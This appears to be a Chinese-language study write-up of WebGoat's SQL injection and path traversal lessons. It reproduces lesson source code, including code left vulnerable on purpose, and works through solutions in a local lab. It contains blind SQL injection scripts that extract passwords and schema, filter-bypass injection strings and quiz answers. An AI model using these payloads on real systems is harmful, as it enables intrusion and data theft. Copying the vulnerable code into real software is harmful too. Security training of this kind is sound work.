        payload = f"' or CASE substr((select group_concat(table_name) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='123456'),{i},1) WHEN '{chr(c)}' THEN true ELSE false END-- "
        # 列
        payload = f"' or CASE substr((select group_concat(column_name) from INFORMATION_SCHEMA.columns where TABLE_NAME='SQL_CHALLENGE_USERS'),{i},1) WHEN '{chr(c)}' THEN true ELSE false END-- "
        # 数据
        payload = f"' or CASE substr((select password from SQL_CHALLENGE_USERS where userid='tom'),{i},1) WHEN '{chr(c)}' THEN true ELSE false END-- "
        data = {
        "username_reg":{payload},
            "email_reg":"11%4011.com",
            "password_reg":"1",
            "confirm_password_reg":"1"
        }
        r = requests.put(url=url,headers=header,data=data)
        if "already" in r.text:
            passwd += chr(c)
            print(passwd)


```

![image-20220908213445711](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908213445711.png)

![image-20220908213851031](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908213851031.png)

![image-20220908214114587](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908214114587.png)

![image-20220908214238156](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908214238156.png)

![image-20220908214912029](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908214912029.png)

#### SqlInjectionQuiz

```java
package com.wanan.webgoat.lessons.sql_injection.advanced;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;

@RestController
public class SqlInjectionQuiz extends AssignmentEndpoint {
    String[] solutions  = {"Solution 4", "Solution 3", "Solution 2", "Solution 3", "Solution 4"};
    boolean[] guesses = new boolean[solutions.length];
    @PostMapping("/SqlInjectionAdvanced/quiz")
    @ResponseBody
    public AttackResult completed(@RequestParam String[] question_0_solution,
                                  @RequestParam String[] question_1_solution,
                                  @RequestParam String[] question_2_solution,
                                  @RequestParam String[] question_3_solution,
                                  @RequestParam String[] question_4_solution) throws IOException{
        int correctAnswers = 0;
        String[] givenAnswers = {question_0_solution[0],question_1_solution[1],question_2_solution[0], question_3_solution[0], question_4_solution[0]};
        for (int i = 0; i < solutions.length;i++){
            if (givenAnswers[i].contains(solutions[1])){
                correctAnswers++;
                guesses[i] = true;
            }else {
                guesses[i] = false;
            }
        }
        if (correctAnswers == solutions.length){
            return success(this).build();
        }else {
            return failed(this).build();
        }

    }
    @GetMapping("/SqlInjectionAdvanced/quiz")
    @ResponseBody
    public boolean[] getResults(){
        return this.guesses;
    }
}
```

答案 4 3 2 3 4

![image-20220908223342069](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908223342069.png)

### mitigation

#### SqlInjectionMitigations

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class SqlInjectionMitigations extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "3.sql.mitigation.title";
    }
}
```

#### SqlInjectionLesson10a

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@Slf4j
@AssignmentHints(value = {"SqlStringInjectionHint-mitigation-10a-1", "SqlStringInjectionHint-mitigation-10a-2"})
public class SqlInjectionLesson10a extends AssignmentEndpoint {
    private String [] results =  {"getConnection", "PreparedStatement", "prepareStatement", "?", "?", "setString", "setString"};
    @PostMapping("/SqlInjectionMitigations/attack1a")
    @ResponseBody
    public AttackResult completed(@RequestParam String field1, @RequestParam String field2, @RequestParam String field3, @RequestParam String field4, @RequestParam String field5, @RequestParam String field6, @RequestParam String field7) {

        String[] userInput = {field1,field2,field3,field4,field5,field6,field7};
        int position = 0;
        boolean completed = false;
        for (String input: userInput){
            if (input.toLowerCase().contains(this.results[position].toLowerCase())){
                completed = true;
            }else {
                return failed(this).build();
            }
            position++;
        }
        if (completed){
            return success(this).build();
        }
        return failed(this).build();
    }

}
```

![image-20220908230652243](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908230652243.png)

#### SqlInjectionLesson10b

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.tools.*;
import java.io.IOException;
import java.net.URI;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint-mitigation-10b-1", "SqlStringInjectionHint-mitigation-10b-2", "SqlStringInjectionHint-mitigation-10b-3", "SqlStringInjectionHint-mitigation-10b-4", "SqlStringInjectionHint-mitigation-10b-5"})
public class SqlInjectionLesson10b extends AssignmentEndpoint {
    @PostMapping("/SqlInjectionMitigations/attack10b")
    @ResponseBody
    public AttackResult completed(@RequestParam String editor){
        try {
            if (editor.isEmpty()) return failed(this).feedback("sql-injection.10b.no-code").build();
            editor = editor.replace("\\<.*?>","");
            
            String regexSetsUpConnection = "(?=.*getConnection.*)";
            String regexUsesPreparedStatement = "(?=.*PreparedStatement.*)";
            String regexUsesPlaceholder = "(?=.*\\=\\?.*|.*\\=\\s\\?.*)";
            String regexUsesSetString = "(?=.*setString.*)";
            String regexUsesExecute = "(?=.*execute.*)";
            String regexUsesExecuteUpdate = "(?=.*executeUpdate.*)";

            String codeline = editor.replace("\n","").replace("\r","");
//            去除 \r \n

            boolean setsUpConnection = this.check_text(regexSetsUpConnection,codeline);
//            这里与代码进行正则匹配
            boolean usesPreparedStatement = this.check_text(regexUsesPreparedStatement,codeline);
            boolean useSetString = this.check_text(regexUsesSetString,codeline);
            boolean usesPlaceholder = this.check_text(regexUsesPlaceholder, codeline);
            boolean usesExecute = this.check_text(regexUsesExecute, codeline);
            boolean usesExecuteUpdate = this.check_text(regexUsesExecuteUpdate, codeline);

            boolean hasImportant = (setsUpConnection && usesPreparedStatement && usesPlaceholder && useSetString && (usesExecute || usesExecuteUpdate));
//          如果都正则通过了
            List<Diagnostic> hasCompiled = this.compileFromString(editor);
//            返回已编译
            if (hasImportant && hasCompiled.size() < 1){
//                如果已经编译完成并且 没有错误
                return success(this).feedback("sql-injection.10b.success").build();
            } else if (hasCompiled.size()>0) {
//                如果编译有错误
                String errors = "";
                for (Diagnostic d : hasCompiled){
                    errors += d.getMessage(null) + "<br>";
                }
                return failed(this).feedback("sql-injection.10b.compiler-errors").output(errors).build();
            }else {
                return failed(this).feedback("sql-injection.10b.failed").build();
            }
        }catch (Exception e){
            return failed(this).output(e.getMessage()).build();
        }
    }

    private List<Diagnostic> compileFromString(String s) {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        //        这里是通过命令行工具获取了一个Java的编译器
        DiagnosticCollector diagnosticCollector = new DiagnosticCollector();
//        提供一种在列表中收集诊断信息的简单方法
        StandardJavaFileManager fileManager = compiler.getStandardFileManager(diagnosticCollector,null,null);
//      通过编译器获取一个标准文件管理器 并传入一个 收集诊断信息的对象
        JavaFileObject javaObjectFromString = getJavaFileContentsAsString(s);
//        获取了文件对象
        Iterable fileObjects = Arrays.asList(javaObjectFromString);
//        将字符串转换成文件数组
        JavaCompiler.CompilationTask task = compiler.getTask(null,fileManager,diagnosticCollector,null,null,fileObjects);
//        null 表示使用err输出信息 fileManager 文件管理器 diagnosticCollector 诊断器 fileObjects要编译的编译单元
        Boolean result = task.call();
//        执行此编译任务
        List<Diagnostic> diagnostics = diagnosticCollector.getDiagnostics();
//        返回诊断的结果
        return diagnostics;
    }

    private SimpleJavaFileObject getJavaFileContentsAsString(String s) {
        StringBuilder javaFileContents = new StringBuilder("import java.sql.*; public class TestClass { static String DBUSER; static String DBPW; static String DBURL; public static void main(String[] args) {" + s + "}}");
//        新建了StringBuilder 对象
        JavaObjectFromString javaFileObject = null;
//        文件操作对象
        try {
            javaFileObject = new JavaObjectFromString("TestClass.java", javaFileContents.toString());
//            第一个为文件路径 第二个为文件内容
        }catch (Exception exception){
            exception.printStackTrace();
        }
        return javaFileObject;
    }
    class JavaObjectFromString extends SimpleJavaFileObject {
//        这里收件继承了 SimpleJavaFileObject 对象
        private String contents = null;
//      新建了一个 contents
        public JavaObjectFromString(String className, String contents) throws Exception {
            super(new URI(className), Kind.SOURCE);
//            这里调动SimpleJavaFileObject 的构造方法 其中第一个参数为路径信息 第二个为文件类型 这里的source 代表.java结尾的常规文件
            this.contents = contents;
        }

        public CharSequence getCharContent(boolean ignoreEncodingErrors) throws IOException {
//            这里获取字符内容
            return contents;
        }
    }

    private boolean check_text(String regex, String text) {
        Pattern p  = Pattern.compile(regex,Pattern.CASE_INSENSITIVE);
//        不区分大小写的正则匹配
        Matcher m = p.matcher(text);
//        匹配的文本
        if (m.find())
//            如果有发现
            return true;
        else
            return false;
    }
}
```

写一串sql查询代码

```java
try{
            Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
            PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name=?");
            stmt.setString(1,"aaa");
            ResultSet results = stmt.executeQuery();
        }catch(Exception  e){
            e.printStackTrace();
}
```

![image-20220909111708681](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909111708681.png)

#### SqlOnlyInputValidation

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.sql_injection.advanced.SqlInjectionLesson6a;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints(value = {"SqlOnlyInputValidation-1", "SqlOnlyInputValidation-2", "SqlOnlyInputValidation-3"})
public class SqlOnlyInputValidation extends AssignmentEndpoint {
    private final SqlInjectionLesson6a lesson6a;

    public SqlOnlyInputValidation(SqlInjectionLesson6a lesson6a) {
        this.lesson6a = lesson6a;
    }

    @PostMapping("/SqlOnlyInputValidation/attack")
    @ResponseBody
    public AttackResult attack(@RequestParam("userid_sql_only_input_validation")String userid){
        if (userid.contains(" ")){
//            过滤sql语句中的空格
            return failed(this).feedback("SqlOnlyInputValidation-failed").build();
        }
        AttackResult attackResult = lesson6a.injectableQuery(userid);
        return new AttackResult(attackResult.isLessonCompleted(),attackResult.getFeedback(),attackResult.getOutput(),getClass().getSimpleName(),true);
    }
}
```

```
'/**/union/**/select/**/1,'2','3','4',user_name,password,7/**/from/**/user_system_data/**//**/where/**/user_name/**/='dave'/**//**/--
```

![image-20220909125018637](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909125018637.png)

```
';select/**/*/**/from/**/user_system_data/**/--
```

![image-20220909125054080](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909125054080.png)

#### SqlOnlyInputValidationOnKeywords

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.sql_injection.advanced.SqlInjectionLesson6a;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.Locale;

@RestController
@AssignmentHints(value = {"SqlOnlyInputValidationOnKeywords-1", "SqlOnlyInputValidationOnKeywords-2", "SqlOnlyInputValidationOnKeywords-3"})
public class SqlOnlyInputValidationOnKeywords extends AssignmentEndpoint {
    private final SqlInjectionLesson6a lesson6a;

    public SqlOnlyInputValidationOnKeywords(SqlInjectionLesson6a lesson6a) {
        this.lesson6a = lesson6a;
    }
    @PostMapping("/SqlOnlyInputValidationOnKeywords/attack")
    @ResponseBody
    public AttackResult attack(@RequestParam("userid_sql_only_input_validation_on_keywords")String userId){
        userId = userId.toUpperCase().replace("FROM","").replace("SELECT","");
        if (userId.contains(" ")){
            return failed(this).feedback("SqlOnlyInputValidationOnKeywords-failed").build();
        }
        AttackResult attackResult = lesson6a.injectableQuery(userId);
        return new AttackResult(attackResult.isLessonCompleted(),attackResult.getFeedback(),attackResult.getOutput(),getClass().getSimpleName(),true);
    }
}
```

过滤的有问题

```
';selselectect/**/*/**/frfromom/**/user_system_data/**/--
```

![image-20220909132411903](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909132411903.png)

#### SqlInjectionLesson13

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint-mitigation-13-1", "SqlStringInjectionHint-mitigation-13-2", "SqlStringInjectionHint-mitigation-13-3", "SqlStringInjectionHint-mitigation-13-4"})
@Slf4j
public class SqlInjectionLesson13 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson13(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjectionMitigations/attack12a")
    @ResponseBody
    public AttackResult completed(@RequestParam String ip){
        try (Connection connection = dataSource.getConnection();
             PreparedStatement preparedStatement = connection.prepareStatement("select ip from servers where ip=? and hostname=?")){
                preparedStatement.setString(1,ip);
                preparedStatement.setString(2,"webgoat-prd");
            ResultSet resultSet = preparedStatement.executeQuery();
            if (resultSet.next()){
                return success(this).build();
            }
            return failed(this).build();
        }catch (SQLException e){
            log.error("Failed",e);
            return (failed(this).build());
        }
    }
}
```

#### Servers

```java
package com.wanan.webgoat.lessons.sql_injection.mitigation;

import com.wanan.webgoat.container.LessonDataSource;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import java.awt.*;
import java.util.ArrayList;
import java.util.List;

@RestController
@RequestMapping("SqlInjectionMitigations/servers")
@Slf4j
public class Servers {
    private final LessonDataSource dataSource;

    @AllArgsConstructor
    @Getter
    private class Server {

        private String id;
        private String hostname;
        private String ip;
        private String mac;
        private String status;
        private String description;
    }

    public Servers(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public java.util.List<Server> sort(@RequestParam String column) throws Exception {
        List<Server> servers = new ArrayList<>();

        try (var connection = dataSource.getConnection()) {
            try (var statement = connection.prepareStatement("select id, hostname, ip, mac, status, description from SERVERS where status <> 'out of order' order by " + column)) {
                try (var rs = statement.executeQuery()) {
                    while (rs.next()) {
                        Server server = new Server(rs.getString(1), rs.getString(2), rs.getString(3), rs.getString(4), rs.getString(5), rs.getString(6));
                        servers.add(server);
                    }
                }
            }
        }
        return servers;
    }

}
```

case when 注入 

![image-20220909165709411](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165709411.png)

![image-20220909165743970](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165743970.png)

构造下 写个脚本

```python
import json
import time

import jsonpath
import requests



header = {
"Cookie":"JSESSIONID=UEYYFGS5YRma89jRPd-MgZmMsAaZcjprDvkwd_QE; XDEBUG_SESSION=XDEBUG_ECLIPSE; csrftoken=K3MAIhCJRXpvtFDEZL8jPBZBaqB4AQUx5URfXIFuNrZf1FouXjtMPTz8kZT9dpf3; rememberMe=K6J1EzKLEEGRyRq4Dk4GSgMqUEoPYPnI7K2GhLNeSk50azVUvwTHQdT78dE6ZMM0V+2xcbpWgT9m+SALVMYHt7ai6bMTERfZMAU2lHViA6IP4AyXh0eaLyzi0Gc9Va0epahdl6lvGna8/0DgSX1/YIqwFMQ7QFaCAAP1LtE/jkE3TQdk7UNBdvpfHWlMSOgZdJZoYhIGxBhnGJxCVX9E+vB3fcILABQBDKvFpYhlGMNl5LMSA+SyBZCCzGpz2e3MgljifDFgNbSmcwVCfFdGc32h78OWzTcZOCbYbOav2Lp5q7960r2iSNZnaI+aX7xDklYgEgxlL6Q6xtZihscVODPiG9Rcy95G9OsQlLfPycpmS8bYcBrvt3Go0lfFcrGY2Uo6vDxj67hj/73f0VpdgWRfXnk0VPSL9uxElbqjx3GAEU2uKf657Uc3e/DpiVsMwovQUIFTDsm78NdL/E6+ONXKCTHcXp+Vym+6ItYGTKlLvfdZwg9D5JXHrtMjwZJz; googtrans=/auto/zh-CN"}
passwd = ""
i = 0
while True:
    i +=1
    for  c in range(32,127):
        url = "http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column="
        # 数据库
        payload =  f"(CASE substr((select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA),{i},1) WHEN '{chr(c)}' THEN id ELSE ip END)"
        # 查表
        payload =  f"(CASE substr((select group_concat(table_name) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='123456'),{i},1) WHEN '{chr(c)}' THEN id ELSE ip END)"
        # 列名
        payload =  f"(CASE substr((select group_concat(column_name) from INFORMATION_SCHEMA.columns where TABLE_NAME='SERVERS'),{i},1) WHEN '{chr(c)}' THEN id ELSE ip END)"
        # 数据
        payload =  f"(CASE substr((select group_concat(ip) from SERVERS where hostname='webgoat-prd'),{i},1) WHEN '{chr(c)}' THEN id ELSE ip END)"
        url += payload

        r = requests.get(url=url,headers=header)
        # print(r.text)
        jsondata = json.loads(r.text)
        ip = jsonpath.jsonpath(jsondata, '$[0].ip')
        if type(ip) == list:
            if '192.168.4.0' in ip:
                passwd += chr(c)
                print(passwd)
```

![image-20220909165300411](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165300411.png)

![image-20220909165633821](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165633821.png)

## path_traversal

### PathTraversal

```java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class PathTraversal extends Lesson {
    @Override
    public Category getDefaultCategory(){
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "path-traversal-title";
    }

}
```

### ProfileUpload

```java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"path-traversal-profile.hint1", "path-traversal-profile.hint2", "path-traversal-profile.hint3"})
public class ProfileUpload extends ProfileUploadBase{
    public ProfileUpload(@Value("${webgoat.server.directory}")String webGoatHomeDirectory, WebSession webSession){
//        获取当前路径信息
        super(webGoatHomeDirectory,webSession);
    }
    @PostMapping(value = "/PathTraversal/profile-upload",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult uploadFileHandler(@RequestParam("uploadedFile")MultipartFile file,@RequestParam(value = "fullName",required = false)String fullName){
        return super.execute(file,fullName);
//        首先获取了一个表单文件 接着传入了一个名字
    }
    @GetMapping("/PathTraversal/profile-picture")
    @ResponseBody
    public ResponseEntity<?> getProfilePicture(){
        return super.getProfilePicture();
//        获取图片信息
    }

}
```

### ProfileUploadBase

```java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.SneakyThrows;
import org.apache.commons.lang3.StringUtils;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.util.FileCopyUtils;
import org.springframework.util.FileSystemUtils;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

@AllArgsConstructor
@Getter
public class ProfileUploadBase extends AssignmentEndpoint {
    private String webGoatHomeDirectory;
    private WebSession webSession;
    protected AttackResult execute(MultipartFile file,String fullName){
        if (file.isEmpty()){
//            如果文件是空的
            return failed(this).feedback("path-traversal-profile-empty-file").build();
        }
        if (StringUtils.isEmpty(fullName)){
//            如果fullName是空的
            return failed(this).feedback("path-traversal-profile-empty-name").build();
        }
        var uploadDirectory = new File(this.webGoatHomeDirectory,"/PathTraversal/" + webSession.getUserName());
//        新建一个文件目录路径对象
        if (uploadDirectory.exists()){
//            如果上传的文件目录存在 就递归删除
            FileSystemUtils.deleteRecursively(uploadDirectory);

        }
        try {
            uploadDirectory.mkdirs();
//            创建文件夹
            var uploadedFile = new File(uploadDirectory,fullName);
//            传入上传路径与文件名
            uploadedFile.createNewFile();
//            创建一个新文件
            FileCopyUtils.copy(file.getBytes(),uploadedFile);
//          将传入文件信息复制到 新文件中
            if (attemptWasMade(uploadDirectory,uploadedFile)){
//             如果文件的存放路径 与文件的路径不同
                return solvedIt(uploadedFile);
            }
            return informationMessage(this).feedback("path-traversal-profile-updated").feedbackArgs(uploadDirectory.getAbsoluteFile()).build();
        }catch (IOException e){
            return failed(this).output(e.getMessage()).build();
        }
    }

    private AttackResult solvedIt(File uploadedFile) throws IOException {
        if (uploadedFile.getCanonicalFile().getParentFile().getName().endsWith("PathTraversal")){
//            如果上传的文件上级文件名为PathTraversal
            return success(this).build();
        }
        return failed(this).attemptWasMade().feedback("path-traversal-profile-attempt").feedbackArgs(uploadedFile.getCanonicalPath()).build();
    }

    private boolean attemptWasMade(File expectedUploadDirectory, File uploadedFile) throws IOException {
        return !expectedUploadDirectory.getCanonicalPath().equals(uploadedFile.getParentFile().getCanonicalPath());
//       是否存在这个文件
    }
    public ResponseEntity<?> getProfilePicture(){
        return ResponseEntity.ok()
                .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))
                .body(getProfilePictureAsBase64());
    }
    protected byte[] getProfilePictureAsBase64(){
        var profilePictureDirectory = new File(this.webGoatHomeDirectory,"/PathTraversal/" + webSession.getUserName());
//        读取文件
        var profileDirectoryFiles = profilePictureDirectory.listFiles();
//        将目录下的所有文件列出来
        if (profileDirectoryFiles != null && profileDirectoryFiles.length > 0){
//            如果文件不是空
            try(var inputStream = new FileInputStream(profileDirectoryFiles[0])) {
//                就获取第一个文件
                return Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(inputStream));
//                进行base64编码输出
            }catch (IOException e){
                return defaultImage();
            }
        }else {
            return defaultImage();
        }
    }
    @SneakyThrows
//    自动抛异常
    private byte[] defaultImage() {
        var inputStream = getClass().getResourceAsStream("/images/account.png");
        return Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(inputStream));
    }

}

```

![image-20220909205611401](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909205611401.png)

这里是目录穿越上传的路径

### ProfileUploadFix

```java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"path-traversal-profile-fix.hint1", "path-traversal-profile-fix.hint2", "path-traversal-profile-fix.hint3"})
public class ProfileUploadFix extends ProfileUploadBase{
    public ProfileUploadFix(@Value("${webgoat.server.directory}") String webGoatHomeDirectory, WebSession webSession) {
        super(webGoatHomeDirectory, webSession);
    }
    @PostMapping(value = "/PathTraversal/profile-upload-fix",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult uploadFileHandler(@RequestParam("uploadedFileFix")MultipartFile file,@RequestParam(value = "fullNameFix",required = false)String fullName){
        return super.execute(file,fullName != null ? fullName.replace("../","") : "");
//        先进行了过滤
    }
    @GetMapping("/PathTraversal/profile-picture-fix")
    @ResponseBody
    public ResponseEntity<?> getProfilePicture(){
        return super.getProfilePicture();
    }
}
```

简单过滤

![image-20220909213319423](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909213319423.png)

### ProfileUploadRemoveUserInput

```Java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"path-traversal-profile-remove-user-input.hint1", "path-traversal-profile-remove-user-input.hint2", "path-traversal-profile-remove-user-input.hint3"})
public class ProfileUploadRemoveUserInput extends ProfileUploadBase{
    public ProfileUploadRemoveUserInput(@Value("${webgoat.server.directory}")String webGoatHomeDirectory, WebSession webSession){
        super(webGoatHomeDirectory,webSession);
    }
    @PostMapping(value = "/PathTraversal/profile-upload-remove-user-input",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult uploadFileHandler(@RequestParam("uploadedFileRemoveUserInput")MultipartFile file){
        return super.execute(file,file.getOriginalFilename());
    }
}
```

![image-20220909214332814](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909214332814.png)

### ProfileUploadRetrieval

```java
package com.wanan.webgoat.lessons.path_traversal;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.RandomUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.jdbc.core.metadata.CallParameterMetaData;
import org.springframework.security.core.token.Sha512DigestUtils;
import org.springframework.util.FileCopyUtils;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.annotation.PostConstruct;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.util.Base64;

@RestController
@AssignmentHints({
        "path-traversal-profile-retrieve.hint1",
        "path-traversal-profile-retrieve.hint2",
        "path-traversal-profile-retrieve.hint3",
        "path-traversal-profile-retrieve.hint4",
        "path-traversal-profile-retrieve.hint5",
        "path-traversal-profile-retrieve.hint6"})
@Slf4j
public class ProfileUploadRetrieval extends AssignmentEndpoint {
    private final File catPicturesDirectory;

    public ProfileUploadRetrieval(@Value("${webgoat.server.directory}")String webGoatHomeDirectory) {
        this.catPicturesDirectory = new File(webGoatHomeDirectory,"/PathTraversal/"+"/cats");
        this.catPicturesDirectory.mkdirs();
    }
    @PostConstruct
    public void initAssignment(){
//        这里是在启动项目时执行的 目的主要是获取图片信息 与初始化flag文件
        for (int i = 1;i <= 10;i++){
            try (InputStream is = new ClassPathResource("lessons/path_traversal/images/cats/" + i + ".jpg").getInputStream()){
//                首先获取所有图片的输入流
                FileCopyUtils.copy(is,new FileOutputStream(new File(catPicturesDirectory,i+".jpg")));
//                复制文件进去
            }catch (Exception e){
                log.error("Unable to copy pictures"+ e.getMessage());
            }
        }
        var secretDirectory = this.catPicturesDirectory.getParentFile().getParentFile();
//        将目录向上移动两级
        try {
            Files.writeString(secretDirectory.toPath().resolve("path-traversal-secret.jpg"),"You found it submit the SHA-512 hash of your username as answer");
//            将字符写入文件

        }catch (IOException e){
            log.error("Unable to write secret in: {}",secretDirectory,e);
        }
    }
    @PostMapping("/PathTraversal/random")
    @ResponseBody
    public AttackResult execute(@RequestParam(value = "secret",required = false)String secret){
//        对比secret是否相同
        if (Sha512DigestUtils.shaHex(getWebSession().getUserName()).equals(secret)){
            return success(this).build();
        }
        return failed(this).build();
    }
